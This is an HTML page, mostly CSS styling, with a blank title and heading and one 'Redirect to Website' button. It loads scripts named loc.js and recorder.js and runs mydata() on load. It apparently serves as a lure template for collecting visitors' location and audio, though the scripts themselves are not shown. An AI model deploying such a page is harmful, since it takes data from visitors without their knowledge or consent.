
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" >
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="../../assets/js/jquery.min.js"></script>
    <script src="../../assets/js/client.min.js"></script>
    <script src="../../assets/js/loc.js"></script>
<style>
* {
  padding: 0;
  margin: 0;
}

body {
  margin: 1rem;
  padding: 1rem;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  max-width: 28rem;
  margin: 0 auto;
  position: relative;
  background: linear-gradient(135deg, #e4e3eb 0%, #cecdd8 50%, #c9c9e1 100%);
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

h1 {
  color: #ffffff;
  text-align: center;
  margin-bottom: 2rem;
  font-size: 1.5rem;
  font-weight: 300;
  letter-spacing: 0.08em;
  text-transform: uppercase;
  text-shadow: 0 0 20px rgba(118, 75, 162, 0.6);
}

#controls {
  display: flex;
  margin-top: 2rem;
  gap: 12px;
}

button {
  flex-grow: 1;
  height: 2.8rem;
  min-width: 2rem;
  border: none;
  border-radius: 12px;
  background: linear-gradient(135deg, #66ea8b 0%, #022212 100%);
  margin-left: 2px;
  box-shadow: 0 4px 15px rgba(118, 75, 162, 0.4);
  cursor: pointer;
  display: flex;
  justify-content: center;
  align-items: center;
  color: #ffffff;
  font-weight: 600;
  font-size: 0.95rem;
  letter-spacing: 0.03em;
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
}

button::after {
  content: '';
  position: absolute;
  inset: 0;
  background: linear-gradient(135deg, rgba(255, 255, 255, 0.15) 0%, transparent 50%);
  opacity: 0;
  transition: opacity 0.3s ease;
}

button:hover::after {
  opacity: 1;
}

button:hover, button:focus {
  outline: none;
  transform: translateY(-2px);
  box-shadow: 0 8px 25px rgba(118, 75, 162, 0.5);
}

button::-moz-focus-inner {
  border: 0;
}

button:active {
  transform: translateY(0);
  box-shadow: 0 2px 10px rgba(118, 75, 162, 0.3);
}

button:disabled {
  pointer-events: none;
  background: linear-gradient(135deg, #4a4a6a 0%, #5a5a7a 100%);
  box-shadow: none;
  opacity: 0.6;
}

button:first-child {
  margin-left: 0;
}

@keyframes pulse {
  0% {
    box-shadow: 0 0 0 0 rgba(118, 75, 162, 0.6);
  }
  70% {
    box-shadow: 0 0 0 12px rgba(118, 75, 162, 0);
  }
  100% {
    box-shadow: 0 0 0 0 rgba(118, 75, 162, 0);
  }
}

button.recording {
  animation: pulse 1.5s infinite;
  background: linear-gradient(135deg, #e94560 0%, #c23152 100%);
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

h1 {
  animation: fadeIn 0.8s ease-out;
}

button {
  animation: fadeIn 0.8s ease-out 0.2s both;
}
</style>
  </head>
  <body onload="mydata()">
    <h1></h1>
 
    <div id="controls">
  	 <button id="redButton" disabled>Redirect to Website</button> 
  
    </div>
    <!-- inserting these scripts at the end to be able to use all the elements in the DOM -->
  	<script src="../../assets/js/recorder.js"></script>
  	<script src="js/_app.js"></script>
    
  </body>
</html>
